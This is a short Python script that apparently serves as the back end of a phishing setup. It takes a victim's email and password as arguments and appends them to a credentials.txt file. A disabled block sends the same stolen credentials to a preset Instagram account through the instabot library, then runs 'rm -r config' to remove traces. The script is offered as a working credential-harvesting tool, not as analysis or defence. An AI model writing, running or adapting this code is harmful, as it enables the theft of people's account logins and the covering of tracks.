'''from instabot import Bot
import os
import sys

email = sys.argv[1]
passwd = sys.argv[2]


bot = Bot()
bot.login(username="",
          password="")
user_ids = ['']
 
text = "email " + email + " password " + passwd

bot.send_messages(text, user_ids)
os.system("rm -r config")'''

import sys

f = open("credentials.txt", "a")
f.write("email: " + sys.argv[1] + " password: " + sys.argv[2] + "\n")
f.close()